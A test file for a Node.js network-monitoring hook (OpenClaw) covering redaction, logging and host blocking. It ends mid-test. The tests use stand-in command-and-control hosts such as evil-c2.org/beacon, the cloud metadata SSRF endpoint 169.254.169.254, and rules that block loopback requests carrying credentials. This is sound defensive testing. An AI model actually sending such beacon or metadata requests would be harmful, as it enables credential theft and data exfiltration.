import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { spawn } from 'child_process';

const hookPath = path.resolve(process.cwd(), 'hooks/network.js');

function loadHook() {
  delete require.cache[require.resolve(hookPath)];
  return require(hookPath);
}

function readEvents(logFile: string): Array<Record<string, unknown>> {
  if (!fs.existsSync(logFile)) return [];
  return fs
    .readFileSync(logFile, 'utf8')
    .split('\n')
    .filter((line) => line.trim().length > 0)
    .map((line) => JSON.parse(line));
}

describe('Node.js network hook', () => {
  let logFile: string;
  let hook: ReturnType<typeof loadHook>;
  let server: any;
  let serverPort: number;
  let http: any;

  beforeEach(async () => {
    logFile = path.join(os.tmpdir(), `openclaw-network-test-${Date.now()}.jsonl`);
    process.env.OPENCLAW_MONITOR_LOG_PATH = logFile;
    // Disable the startup grace period in tests so that requests made immediately
    // after module load are still captured.
    process.env.OPENCLAW_NETWORK_HOOK_STARTUP_GRACE_MS = '0';

    // Load the hook before requiring http, so the CJS module object is patched
    // before any request is issued by the test.
    hook = loadHook();
    hook.install();

    // Require http after the hook is installed to ensure we use the patched CJS
    // module reference (ESM namespace objects may proxy differently).
    http = require('http');

    server = http.createServer((req: any, res: any) => {
      let body = '';
      req.on('data', (chunk: Buffer) => {
        body += chunk.toString();
      });
      req.on('end', () => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ received: body, path: req.url, method: req.method }));
      });
    });

    await new Promise<void>((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const addr = server.address() as { port: number };
        serverPort = addr.port;
        resolve();
      });
    });
  });

  afterEach(async () => {
    hook.uninstall();
    delete process.env.OPENCLAW_MONITOR_LOG_PATH;
    delete process.env.OPENCLAW_NETWORK_HOOK_STARTUP_GRACE_MS;

    await new Promise<void>((resolve) => {
      server.close(() => resolve());
    });

    try {
      fs.unlinkSync(logFile);
    } catch {
      // ignore
    }
  });

  it('marks the http module as hooked', () => {
    expect(http.__openclaw_network_hooked).toBe(true);
  });

  // Unwrapped originals must not be reachable through the global symbol
  // registry — a Symbol.for('openclaw.originals') cache would hand
  // in-process attackers a one-liner bypass for every wrapped API.
  it('does not cache originals under Symbol.for', () => {
    const probe = Symbol.for('openclaw.originals');
    expect((globalThis.fetch as unknown as Record<PropertyKey, unknown>)?.[probe]).toBeUndefined();
    expect((http as Record<PropertyKey, unknown>)[probe]).toBeUndefined();
    expect(Object.getOwnPropertySymbols(globalThis.fetch)).not.toContain(probe);
    expect(Object.getOwnPropertySymbols(http)).not.toContain(probe);
  });

  it('builds a standard network_http event', () => {
    const event = hook.buildNetworkEvent(
      {
        options: 'http://127.0.0.1:8989/api/workflow_api/node_template_list',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{"node_types":["1"]}',
      },
      {
        statusCode: 200,
        statusMessage: 'OK',
        body: '{"ok":true}',
        endTime: Date.now() + 21,
      },
      Date.now()
    );

    expect(event.comm).toBe('openclaw');
    expect(event.event_type).toBe('network_http');
    expect(event.layer).toBe('system');
    expect(event.collection_method).toBe('runtime');
    expect(event.service).toBe('http');
    expect(event.direction).toBe('send');
    expect(event.method).toBe('POST');
    expect(event.url).toBe('/api/workflow_api/node_template_list');
    expect(event.host).toBe('127.0.0.1:8989');
    expect(event.code).toBe(200);
    expect(event.header).toContain('Content-Type: application/json');
    expect(event.body).toBe('{"node_types":["1"]}');
    expect(event.content).toBe('{"ok":true}');
    expect(event.content_length).toBe(event.content.length);
    expect(event.pid).toBe(process.pid);
  });

  it('redacts sensitive headers in raw header string', () => {
    const raw = hook.headersToRawString({
      'Content-Type': 'application/json',
      Authorization: 'Bearer secret-token',
      Cookie: 'session=abc123',
    });
    expect(raw).toContain('Content-Type: application/json');
    expect(raw).toContain('Authorization: Bearer ***');
    expect(raw).toContain('Cookie: session=***');
    expect(raw).not.toContain('secret-token');
    expect(raw).not.toContain('abc123');
  });

  it('redacts sensitive body fields', () => {
    const redacted = hook.redactSensitiveBody('{"password":"secret123","data":"ok"}');
    expect(redacted).toContain('"password":"***"');
    expect(redacted).toContain('"data":"ok"');
    expect(redacted).not.toContain('secret123');
  });

  it('redacts vendor-issued token keys in JSON bodies (tenant_access_token et al)', () => {
    // 全合成值：形状仿飞书 tenant_access_token，与任何真实凭据无关
    // （早期版本曾在 fixture 中误用真实泄露值）。
    const body =
      '{"code":0,"expire":7086,"msg":"ok","tenant_access_token":"t-g0000SYNTHFAKE0000000000000000FAKE"}';
    const redacted = hook.redactSensitiveBody(body);
    expect(redacted).toContain('"tenant_access_token":"***"');
    expect(redacted).toContain('"msg":"ok"');
    expect(redacted).not.toContain('t-g0000SYNTH');
  });

  it('redacts app_secret-style keys added to the sensitive set', () => {
    const redacted = hook.redactSensitiveBody(
      '{"app_id":"cli_a0000fakefake00","app_secret":"synthSecretValue1234567890abcd"}'
    );
    expect(redacted).toContain('"app_secret":"***"');
    expect(redacted).toContain('"app_id":"cli_a0000fakefake00"');
    expect(redacted).not.toContain('synthSecret');
  });

  it('redacts quoted key shapes in non-JSON fallback bodies', () => {
    const body = 'error: invalid \\"tenant_access_token\\":\\"t-g0000fake\\" for app';
    const redacted = hook.redactSensitiveBody(body);
    expect(redacted).not.toContain('t-g0000fake');
    expect(redacted).toContain('***');
  });

  it('keeps redacting plain query-string shapes in fallback bodies', () => {
    const redacted = hook.redactSensitiveBody('token=abc123&foo=bar');
    expect(redacted).not.toContain('abc123');
    expect(redacted).toContain('foo=bar');
  });

  it('parses URL string options', () => {
    const info = hook.buildUrlString('http://127.0.0.1:8989/api/workflow_api/node_template_list');
    expect(info.host).toBe('127.0.0.1:8989');
    expect(info.hostname).toBe('127.0.0.1');
    expect(info.pathname).toBe('/api/workflow_api/node_template_list');
  });

  it('parses object options', () => {
    const info = hook.buildUrlString({
      protocol: 'https:',
      hostname: 'api.openai.com',
      port: 443,
      path: '/v1/chat/completions',
      method: 'POST',
    });
    expect(info.host).toBe('api.openai.com:443');
    expect(info.pathname).toBe('/v1/chat/completions');
  });

  // fetch(new Request(...)) / fetch(new URL(...)) need explicit parsing: the
  // generic object branch yields host='' and would skip the host block list.
  it('parses Request / URL instances so host blocking applies', () => {
    const req = new Request('http://169.254.169.254/notify');
    const fromRequest = hook.buildUrlString(req);
    expect(fromRequest.hostname).toBe('169.254.169.254');
    expect(fromRequest.host).toBe('169.254.169.254');
    expect(fromRequest.pathname).toBe('/notify');

    const fromUrl = hook.buildUrlString(new URL('http://169.254.169.254/latest/meta-data/'));
    expect(fromUrl.hostname).toBe('169.254.169.254');
    expect(fromUrl.pathname).toBe('/latest/meta-data/');

    process.env.OPENCLAW_NETWORK_ENFORCE = 'true';
    try {
      expect(
        hook.checkRequestBlocked({ options: req, method: 'GET', headers: {} })
      ).toContain('blocked host: 169.254.169.254');
      expect(
        hook.checkRequestBlocked({ options: new URL('http://metadata.google.internal/x'), method: 'GET', headers: {} })
      ).toContain('blocked host: metadata.google.internal');
    } finally {
      delete process.env.OPENCLAW_NETWORK_ENFORCE;
    }
  });

  it('captures http.request and response', async () => {
    const url = `http://127.0.0.1:${serverPort}/api/test`;

    await new Promise<void>((resolve, reject) => {
      const req = http.request(url, { method: 'POST' }, (res: any) => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      });
      req.on('error', reject);
      req.write('{"hello":"world"}');
      req.end();
    });

    // Give the event loop a moment to flush the log.
    await new Promise((resolve) => setTimeout(resolve, 100));

    const events = readEvents(logFile);
    const match = events.find(
      (e) => e.event_type === 'network_http' && typeof e.url === 'string' && e.url === '/api/test'
    );

    expect(match).toBeDefined();
    expect(match).toMatchObject({
      event_type: 'network_http',
      method: 'POST',
      url: '/api/test',
      host: `127.0.0.1:${serverPort}`,
      code: 200,
      service: 'http',
      direction: 'send',
    });
    expect(match?.body).toBe('{"hello":"world"}');
    expect(match?.content).toContain('received');
    expect(match?.content_length).toBeGreaterThan(0);
  });

  it('captures http.get', async () => {
    await new Promise<void>((resolve, reject) => {
      http.get(`http://127.0.0.1:${serverPort}/api/get`, (res: any) => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      }).on('error', reject);
    });

    await new Promise((resolve) => setTimeout(resolve, 100));

    const events = readEvents(logFile);
    const match = events.find(
      (e) => e.event_type === 'network_http' && e.url === '/api/get'
    );
    expect(match).toBeDefined();
    expect(match).toMatchObject({
      method: 'GET',
      code: 200,
    });
  });

  it('filters self-reporting requests to the collector endpoint', async () => {
    process.env.OPENCLAW_MONITOR_ENDPOINT = `http://127.0.0.1:${serverPort}/api/v1/events`;

    // Re-install to pick up the endpoint filter.
    hook.uninstall();
    hook = loadHook();
    hook.install();

    await new Promise<void>((resolve, reject) => {
      http.get(`http://127.0.0.1:${serverPort}/api/v1/events`, (res: any) => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      }).on('error', reject);
    });

    await new Promise((resolve) => setTimeout(resolve, 100));

    const events = readEvents(logFile);
    const match = events.find(
      (e) => e.event_type === 'network_http' && e.url === '/api/v1/events'
    );
    expect(match).toBeUndefined();

    delete process.env.OPENCLAW_MONITOR_ENDPOINT;
  });

  it('applies default ignore hosts for package-registry traffic', () => {
    expect(hook.isIgnoredEvent({ host: 'registry.npmjs.org', url: '/openclaw/latest' })).toBe(true);
    expect(hook.isIgnoredEvent({ host: 'open.feishu.cn', url: '/' })).toBe(false);
    expect(hook.isIgnoredEvent({ host: '127.0.0.1:18789', url: '/' })).toBe(false);
    expect(hook.isIgnoredEvent({ host: '127.0.0.1', url: '/' })).toBe(false);
    expect(hook.isIgnoredEvent({ host: 'example.com', url: '/data' })).toBe(false);
  });

  it('applies default ignore URLs for common OpenClaw internal paths', () => {
    expect(hook.isIgnoredEvent({ host: 'any-host', url: '/v1/chat/completions' })).toBe(true);
    expect(hook.isIgnoredEvent({ host: 'any-host', url: '/ws/v2' })).toBe(true);
    expect(hook.isIgnoredEvent({ host: 'any-host', url: '/callback/ws/endpoint' })).toBe(true);
    expect(hook.isIgnoredEvent({ host: 'any-host', url: '/api/public' })).toBe(false);
  });

  it('truncates headers and body to configured limits', () => {
    const longHeader = 'X-Long: ' + 'a'.repeat(5000);
    const longBody = 'b'.repeat(10000);
    const event = hook.buildNetworkEvent(
      {
        options: 'http://api.example.com/upload',
        method: 'POST',
        headers: { 'X-Long': longHeader },
        body: longBody,
      },
      {
        statusCode: 200,
        statusMessage: 'OK',
        body: longBody,
        endTime: Date.now() + 21,
      },
      Date.now()
    );

    expect(event.header.length).toBeLessThanOrEqual(2048 + 3); // allow truncation marker
    expect(event.header.endsWith('...')).toBe(true);
    expect(event.body.length).toBeLessThanOrEqual(4096 + 3);
    expect(event.body.endsWith('...')).toBe(true);
    expect(event.content.length).toBeLessThanOrEqual(4096 + 3);
    expect(event.content.endsWith('...')).toBe(true);
  });

  it('associates OpenClaw context with network events', async () => {
    (global as any).__OPENCLAW_SESSION_ID__ = 'sess-network';
    (global as any).__OPENCLAW_RUN_ID__ = 'run-network';
    (global as any).__OPENCLAW_AGENT_ID__ = 'agent-network';
    (global as any).__OPENCLAW_TOOL_CALL_ID__ = 'call-network';
    (global as any).__OPENCLAW_TOOL_NAME__ = 'web_search';

    // Re-install to pick up context getter reference (it captures global lazily).
    hook.uninstall();
    hook = loadHook();
    hook.install();

    await new Promise<void>((resolve, reject) => {
      http.get(`http://127.0.0.1:${serverPort}/api/context`, (res: any) => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      }).on('error', reject);
    });

    await new Promise((resolve) => setTimeout(resolve, 100));

    const events = readEvents(logFile);
    const match = events.find(
      (e) => e.event_type === 'network_http' && e.url === '/api/context'
    );
    expect(match).toBeDefined();
    expect(match?.session_id).toBe('sess-network');
    expect(match?.run_id).toBe('run-network');
    expect(match?.agent_id).toBe('agent-network');
    expect(match?.tool_call_id).toBe('call-network');
    expect(match?.tool_name).toBe('web_search');

    delete (global as any).__OPENCLAW_SESSION_ID__;
    delete (global as any).__OPENCLAW_RUN_ID__;
    delete (global as any).__OPENCLAW_AGENT_ID__;
    delete (global as any).__OPENCLAW_TOOL_CALL_ID__;
    delete (global as any).__OPENCLAW_TOOL_NAME__;
  });

  it('exposes drop counters that increment when emitEvent drops events', () => {
    hook.resetDropCounts();
    const countsBefore = hook.getDropCounts();
    expect(countsBefore.selfReporting).toBe(0);
    expect(countsBefore.ignoredHost).toBe(0);
    expect(countsBefore.ignoredUrl).toBe(0);
    expect(countsBefore.emitted).toBe(0);

    // Drive emitEvent indirectly by checking the filter: counts do not move
    // because emitEvent is internal. What we can verify externally is that
    // isIgnoredEvent matches the default lists exactly so the filter is
    // actually capable of dropping them.
    expect(hook.isIgnoredEvent({ host: 'registry.npmjs.org', url: '/anywhere' })).toBe(true);
  });

  it('drops network events during the startup grace period', async () => {
    // Use a subprocess so the module load time is real and the patched
    // http.request closure points to the new module's emitEvent. In-process
    // reload cannot reliably swap the closure captured by Node's http module.
    const testLogFile = path.join(os.tmpdir(), `openclaw-network-grace-${Date.now()}.jsonl`);
    const env = {
      ...process.env,
      OPENCLAW_MONITOR_LOG_PATH: testLogFile,
      OPENCLAW_NETWORK_HOOK_STARTUP_GRACE_MS: '1000',
      OPENCLAW_NETWORK_HOOK_DEBUG: '1',
    };

    const script = `
      const http = require('http');
      const hook = require('${hookPath.replace(/\\/g, '\\\\')}');
      hook.install();
      const server = http.createServer((req, res) => {
        let body = '';
        req.on('data', (c) => (body += c));
        req.on('end', () => {
          res.writeHead(200);
          res.end(JSON.stringify({ path: req.url }));
        });
      });
      server.listen(0, '127.0.0.1', async () => {
        const port = server.address().port;
        const get = (p) => new Promise((resolve, reject) => {
          http.get('http://127.0.0.1:' + port + p, (res) => {
            res.on('data', () => {});
            res.on('end', resolve);
          }).on('error', reject);
        });
        await get('/grace-1');
        await new Promise((r) => setTimeout(r, 1100));
        await get('/grace-2');
        server.close(() => {
          setTimeout(() => {
            const fs = require('fs');
            const lines = (fs.existsSync(process.env.OPENCLAW_MONITOR_LOG_PATH) ?
              fs.readFileSync(process.env.OPENCLAW_MONITOR_LOG_PATH, 'utf8').trim().split('\\n').filter(Boolean) : []);
            console.log('---GRACE_RESULT---');
            console.log(JSON.stringify(lines.map((l) => JSON.parse(l).url)));
            process.exit(0);
          }, 100);
        });
      });
    `;

    const result = await new Promise<{ stdout: string; stderr: string }>((resolve, reject) => {
      const cp = spawn(process.execPath, ['-e', script], { env, cwd: process.cwd() });
      let stdout = '';
      let stderr = '';
      cp.stdout.on('data', (d) => (stdout += d.toString()));
      cp.stderr.on('data', (d) => (stderr += d.toString()));
      cp.on('error', reject);
      cp.on('close', () => resolve({ stdout, stderr }));
    });

    try {
      fs.unlinkSync(testLogFile);
    } catch {
      // ignore
    }

    const marker = '---GRACE_RESULT---';
    const markerIdx = result.stdout.indexOf(marker);
    expect(markerIdx).toBeGreaterThanOrEqual(0);
    const urls = JSON.parse(result.stdout.slice(markerIdx + marker.length).trim());
    expect(urls).toContain('/grace-2');
    expect(urls).not.toContain('/grace-1');
  });

  it('exports getDropCounts and resetDropCounts', () => {
    expect(typeof hook.getDropCounts).toBe('function');
    expect(typeof hook.resetDropCounts).toBe('function');
    hook.resetDropCounts();
    expect(hook.getDropCounts()).toEqual({
      selfReporting: 0,
      ignoredHost: 0,
      ignoredUrl: 0,
      startupGrace: 0,
      hookDisabled: 0,
      noLogPath: 0,
      writeError: 0,
      emitted: 0,
    });
  });

  describe('network enforcement in subprocess', () => {
    function runWithEnforce(scriptBody: string, blockedHosts?: string): Promise<{ stdout: string; logFile: string }> {
      const testLogFile = path.join(os.tmpdir(), `openclaw-network-enforce-${Date.now()}-${Math.random().toString(36).slice(2)}.jsonl`);
      const env: Record<string, string | undefined> = {
        ...process.env,
        OPENCLAW_MONITOR_LOG_PATH: testLogFile,
        OPENCLAW_NETWORK_ENFORCE: 'true',
        OPENCLAW_NETWORK_HOOK_STARTUP_GRACE_MS: '0',
      };
      if (blockedHosts !== undefined) {
        env.OPENCLAW_NETWORK_BLOCKED_HOSTS = blockedHosts;
      }
      const script = `
        const http = require('http');
        const hook = require('${hookPath.replace(/\\/g, '\\\\')}');
        hook.install();
        ${scriptBody}
      `;
      return new Promise<{ stdout: string; logFile: string }>((resolve, reject) => {
        const cp = spawn(process.execPath, ['-e', script], { env, cwd: process.cwd() });
        let stdout = '';
        let stderr = '';
        cp.stdout.on('data', (d) => (stdout += d.toString()));
        cp.stderr.on('data', (d) => (stderr += d.toString()));
        cp.on('error', reject);
        cp.on('close', () => {
          if (stderr) console.error(stderr);
          resolve({ stdout, logFile: testLogFile });
        });
      });
    }

    function readLog(logFile: string): Array<Record<string, unknown>> {
      try {
        return fs
          .readFileSync(logFile, 'utf8')
          .split('\n')
          .filter((line) => line.trim().length > 0)
          .map((line) => JSON.parse(line));
      } catch {
        return [];
      }
    }

    it('blocks requests to hosts in OPENCLAW_NETWORK_BLOCKED_HOSTS', async () => {
      const { stdout, logFile } = await runWithEnforce(
        `try { const req = http.request('http://malicious-c2-1.com/notify', { method: 'GET' }, () => { console.log('ALLOWED'); process.exit(0); }); req.on('error', (err) => { console.log(err.message.includes('network hook') ? 'BLOCKED' : 'ERROR'); process.exit(0); }); req.end(); } catch (err) { console.log(err.message.includes('network hook') ? 'BLOCKED' : 'ERROR'); process.exit(0); }`,
        'malicious-c2-1.com'
      );
      await new Promise((resolve) => setTimeout(resolve, 200));
      const events = readLog(logFile);
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      expect(stdout).toContain('BLOCKED');
      expect(events.some((e) => e.event_type === 'network_http' && e.domain_name === 'malicious-c2-1.com' && e.blocked)).toBe(true);
    });

    it('blocks requests to metadata SSRF endpoint', async () => {
      const { stdout, logFile } = await runWithEnforce(
        `try { const req = http.request('http://169.254.169.254/latest/meta-data/', { method: 'GET' }, () => { console.log('ALLOWED'); process.exit(0); }); req.on('error', (err) => { console.log(err.message.includes('network hook') ? 'BLOCKED' : 'ERROR'); process.exit(0); }); req.end(); } catch (err) { console.log(err.message.includes('network hook') ? 'BLOCKED' : 'ERROR'); process.exit(0); }`
      );
      await new Promise((resolve) => setTimeout(resolve, 200));
      const events = readLog(logFile);
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      expect(stdout).toContain('BLOCKED');
      expect(events.some((e) => e.event_type === 'network_http' && e.host === '169.254.169.254' && e.blocked)).toBe(true);
    });

    // fetch(new Request(url)) needs explicit host extraction: a Request
    // instance has no .hostname, so the wrapper would otherwise derive
    // host='' and skip the host block list.
    it('blocks fetch(Request) to a blocked host', async () => {
      const { stdout, logFile } = await runWithEnforce(
        `(async () => {
          try {
            await fetch(new Request('http://malicious-c2-1.com/notify'));
            console.log('ALLOWED');
          } catch (err) {
            console.log(err && err.message.includes('network hook') ? 'BLOCKED' : 'ERROR');
          }
          process.exit(0);
        })();`,
        'malicious-c2-1.com'
      );
      await new Promise((resolve) => setTimeout(resolve, 200));
      const events = readLog(logFile);
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      expect(stdout).toContain('BLOCKED');
      expect(
        events.some(
          (e) => e.event_type === 'network_http' && e.domain_name === 'malicious-c2-1.com' && e.blocked
        )
      ).toBe(true);
    });

    // Same fix covers the plain fetch(URL) shape.
    it('blocks fetch(URL) to a blocked host', async () => {
      const { stdout, logFile } = await runWithEnforce(
        `(async () => {
          try {
            await fetch(new URL('http://evil-c2.org/beacon'));
            console.log('ALLOWED');
          } catch (err) {
            console.log(err && err.message.includes('network hook') ? 'BLOCKED' : 'ERROR');
          }
          process.exit(0);
        })();`,
        'evil-c2.org'
      );
      await new Promise((resolve) => setTimeout(resolve, 200));
      const events = readLog(logFile);
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      expect(stdout).toContain('BLOCKED');
      expect(
        events.some((e) => e.event_type === 'network_http' && e.domain_name === 'evil-c2.org' && e.blocked)
      ).toBe(true);
    });

    it('allows requests to non-blocked hosts when enforcement is on', async () => {
      const server = http.createServer((req, res) => {
        res.writeHead(200);
        res.end('ok');
      });
      const { port } = await new Promise<{ port: number }>((resolve) => {
        server.listen(0, '127.0.0.1', () => {
          resolve({ port: (server.address() as { port: number }).port });
        });
      });
      const { stdout, logFile } = await runWithEnforce(
        `try { const req = http.request('http://127.0.0.1:${port}/api/allowed', { method: 'GET' }, (res) => { res.on('data', () => {}); res.on('end', () => { console.log('ALLOWED'); process.exit(0); }); }); req.on('error', (err) => { console.log('ERROR', err.message); process.exit(0); }); req.end(); } catch (err) { console.log('ERROR', err.message); process.exit(0); }`,
        'malicious-c2-1.com,malicious-c2-2.net,evil-c2.org'
      );
      await new Promise((resolve) => setTimeout(resolve, 200));
      const events = readLog(logFile);
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      server.close();
      expect(stdout).toContain('ALLOWED');
      expect(events.some((e) => e.event_type === 'network_http' && e.url === '/api/allowed' && !e.blocked)).toBe(true);
    });
  });

  // enforce 与 networkEnabled 开关都必须在每次
  // 调用时惰性读取——插件 initialize() 晚于 hook preload，preload 期快照的
  // 常量对 gateway 本进程永远无效。
  describe('lazy env reads and networkEnabled toggle', () => {
    const ENV_KEYS = ['OPENCLAW_NETWORK_ENFORCE', 'OPENCLAW_NETWORK_HOOK_ENABLED'];
    const saved: Record<string, string | undefined> = {};

    beforeEach(() => {
      for (const k of ENV_KEYS) {
        saved[k] = process.env[k];
        delete process.env[k];
      }
    });

    afterEach(() => {
      for (const k of ENV_KEYS) {
        if (saved[k] === undefined) delete process.env[k];
        else process.env[k] = saved[k];
      }
    });

    it('picks up OPENCLAW_NETWORK_ENFORCE set after the hook was loaded', () => {
      const reqInfo = { options: 'http://169.254.169.254/notify', method: 'GET', headers: {} };
      expect(hook.checkRequestBlocked(reqInfo)).toBeUndefined();
      process.env.OPENCLAW_NETWORK_ENFORCE = 'true';
      expect(hook.checkRequestBlocked(reqInfo)).toContain('blocked host');
      delete process.env.OPENCLAW_NETWORK_ENFORCE;
      expect(hook.checkRequestBlocked(reqInfo)).toBeUndefined();
    });

    it('OPENCLAW_NETWORK_HOOK_ENABLED=false disables blocking even when enforce is on', () => {
      process.env.OPENCLAW_NETWORK_ENFORCE = 'true';
      process.env.OPENCLAW_NETWORK_HOOK_ENABLED = 'false';
      const reqInfo = { options: 'http://169.254.169.254/notify', method: 'GET', headers: {} };
      expect(hook.checkRequestBlocked(reqInfo)).toBeUndefined();
      expect(hook.shouldBlockRequest({ host: '169.254.169.254', url: '/notify' })).toBeUndefined();
    });

    // 插件 initialize 后把权威值钉在 globalThis，hook 判定先查
    // 钉住值——进程内篡改 process.env 不再影响 enforcement。
    it('prefers pinned values over process.env once pinned', () => {
      const PIN_KEY = '__OPENCLAW_SECURITY_HOOK_ENV__';
      const reqInfo = { options: 'http://169.254.169.254/notify', method: 'GET', headers: {} };
      try {
        expect(hook.checkRequestBlocked(reqInfo)).toBeUndefined();
        (globalThis as Record<string, unknown>)[PIN_KEY] = () => ({
          OPENCLAW_NETWORK_ENFORCE: 'true',
          OPENCLAW_NETWORK_HOOK_ENABLED: 'true',
        });
        expect(hook.checkRequestBlocked(reqInfo)).toContain('blocked host: 169.254.169.254');

        // 钉住后进程内篡改 env 无效。
        process.env.OPENCLAW_NETWORK_ENFORCE = 'false';
        process.env.OPENCLAW_NETWORK_HOOK_ENABLED = 'false';
        expect(hook.checkRequestBlocked(reqInfo)).toContain('blocked host: 169.254.169.254');
      } finally {
        delete (globalThis as Record<string, unknown>)[PIN_KEY];
        delete process.env.OPENCLAW_NETWORK_ENFORCE;
      }
    });

    // 事件落盘路径要经过 http 模块上已安装的 wrapper，其闭包绑定首次加载的
    // 模块实例——同进程 reload 换不掉它（见上方 startup grace 用例的说明），
    // 因此落盘行为断言必须走子进程。
    function runCaptureSubprocess(toggleValue: string | undefined): Promise<{ stdout: string; stderr: string; logFile: string }> {
      const testLogFile = path.join(os.tmpdir(), `openclaw-network-toggle-${Date.now()}-${Math.random().toString(36).slice(2)}.jsonl`);
      const env: Record<string, string | undefined> = {
        ...process.env,
        OPENCLAW_MONITOR_LOG_PATH: testLogFile,
        OPENCLAW_NETWORK_HOOK_STARTUP_GRACE_MS: '0',
        OPENCLAW_NETWORK_HOOK_ENABLED: toggleValue,
        // 丢包计数是 DEBUG 才输出的诊断行（默认静默，见 hooks/hook-log-noise.test.ts），
        // 而"事件被丢弃"这件事唯一的证据就是这行计数 —— 所以取证时把开关打开。
        OPENCLAW_HOOK_DEBUG: '1',
      };
      const script = `
        const http = require('http');
        const hook = require('${hookPath.replace(/\\/g, '\\\\')}');
        hook.install();
        const server = http.createServer((req, res) => { res.writeHead(200); res.end('ok'); });
        server.listen(0, '127.0.0.1', () => {
          const port = server.address().port;
          const req = http.request('http://127.0.0.1:' + port + '/api/toggle', { method: 'GET' }, (res) => {
            res.on('data', () => {});
            res.on('end', () => { console.log('REQUEST_DONE'); server.close(() => process.exit(0)); });
          });
          req.on('error', (err) => { console.log('REQUEST_ERROR', err.message); process.exit(1); });
          req.end();
        });
      `;
      return new Promise((resolve, reject) => {
        const cp = spawn(process.execPath, ['-e', script], { env, cwd: process.cwd() });
        let stdout = '';
        let stderr = '';
        cp.stdout.on('data', (d) => (stdout += d.toString()));
        cp.stderr.on('data', (d) => (stderr += d.toString()));
        cp.on('error', reject);
        cp.on('close', () => resolve({ stdout, stderr, logFile: testLogFile }));
      });
    }

    it('drops captured events when the hook is disabled', async () => {
      const { stdout, stderr, logFile } = await runCaptureSubprocess('false');
      expect(stdout).toContain('REQUEST_DONE');
      expect(stderr).toMatch(/hookDisabled=[1-9]\d*/);
      const written = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8').trim() : '';
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      expect(written).toBe('');
    });

    it('keeps capturing when the toggle is enabled (default)', async () => {
      const { stdout, logFile } = await runCaptureSubprocess(undefined);
      expect(stdout).toContain('REQUEST_DONE');
      const events = fs.existsSync(logFile)
        ? fs.readFileSync(logFile, 'utf8').split('\n').filter((line) => line.trim().length > 0).map((line) => JSON.parse(line))
        : [];
      try {
        fs.unlinkSync(logFile);
      } catch {
        // ignore
      }
      expect(events.some((e: any) => e.url === '/api/toggle')).toBe(true);
    });
  });
});

// ---------------------------------------------------------------------------
// #469-C（2026-10-29）：**回环默认放行** + **回环带凭据仍拦**
//
// 缺陷：默认黑名单第一条 `^127\.` 把全部回环一刀切 ⇒ 容器内平台组件对本地
// socket.io 服务 127.0.0.1:18789 的正常 WebSocket 重试被 collateral 拦截
// 12 次（6 个唯一事件 × 2 次）—— 请求头只有 Sec-WebSocket-* / Connection /
// Upgrade，**没有任何凭据**。
//
// 修复：回环移出默认黑名单（回环只能连到本机 ⇒ 出网风险为零），但
// **「回环 + 敏感头携带凭据」仍拦**（凭据外带 / 侧信道）。
//
// 本文件锁住三件事：
//   1. 工单样例（回环 + 无凭据头）⇒ **放行**；
//   2. 工单真阳性（回环 + Authorization: Bearer）⇒ **仍然拦截**；
//   3. 非回环目标（RFC1918 / 元数据端点）⇒ **判定不变**。
// ---------------------------------------------------------------------------
describe('#469-C network hook 回环默认放行', () => {
  let hook: ReturnType<typeof loadHook>;
  const saved: Record<string, string | undefined> = {};

  beforeEach(() => {
    for (const k of [
      'OPENCLAW_NETWORK_ENFORCE',
      'OPENCLAW_NETWORK_BLOCKED_HOSTS',
      'OPENCLAW_NETWORK_HOOK_IGNORE_HOSTS',
      'OPENCLAW_MONITOR_ENDPOINT',
    ]) {
      saved[k] = process.env[k];
      delete process.env[k];
    }
    // ⛔ 名单在**模块加载时**读一次 ⇒ 必须先清干净再 load。
    process.env.OPENCLAW_NETWORK_ENFORCE = 'true';
    hook = loadHook();
  });

  afterEach(() => {
    for (const k of Object.keys(saved)) {
      if (saved[k] === undefined) delete process.env[k];
      else process.env[k] = saved[k];
    }
  });

  describe('应当放行：回环 + 无凭据头（工单原始样例）', () => {
    it('WebSocket 升级握手（Sec-WebSocket-* / Connection / Upgrade）⇒ 放行', () => {
      const reason = hook.checkRequestBlocked({
        options: 'http://127.0.0.1:18789/',
        method: 'GET',
        headers: {
          'Sec-WebSocket-Version': '13',
          'Sec-WebSocket-Key': 'U/RyfJ+v9gdwKnng2gQsTA==',
          Connection: 'Upgrade',
          Upgrade: 'websocket',
        },
      });
      expect(reason).toBeUndefined();
    });

    it('普通回环请求（无任何头）⇒ 放行', () => {
      expect(
        hook.checkRequestBlocked({ options: 'http://127.0.0.1:8080/health', method: 'GET', headers: {} })
      ).toBeUndefined();
    });

    it('localhost / [::1] ⇒ 放行', () => {
      expect(
        hook.checkRequestBlocked({ options: 'http://localhost:3000/', method: 'GET', headers: {} })
      ).toBeUndefined();
      expect(
        hook.checkRequestBlocked({ options: 'http://[::1]:3000/', method: 'GET', headers: {} })
      ).toBeUndefined();
    });
  });

  describe('仍然拦截：回环 + 携带凭据（工单真阳性 258b182f）', () => {
    it('Authorization: Bearer <token> ⇒ 拦截', () => {
      const reason = hook.checkRequestBlocked({
        options: 'http://127.0.0.1:18789/',
        method: 'GET',
        headers: { Authorization: 'Bearer gx1234567890abcdef' },
      });
      expect(reason).toContain('loopback-credential');
      expect(reason).toContain('127.0.0.1:18789');
    });

    it('x-api-key 头 ⇒ 拦截', () => {
      expect(
        hook.checkRequestBlocked({
          options: 'http://127.0.0.1:18789/',
          method: 'GET',
          headers: { 'x-api-key': 'abcdef123456' },
        })
      ).toContain('loopback-credential');
    });

    it('Cookie 头 ⇒ 拦截', () => {
      expect(
        hook.checkRequestBlocked({
          options: 'http://127.0.0.1:18789/',
          method: 'GET',
          headers: { Cookie: 'sid=abcdef123456' },
        })
      ).toContain('loopback-credential');
    });

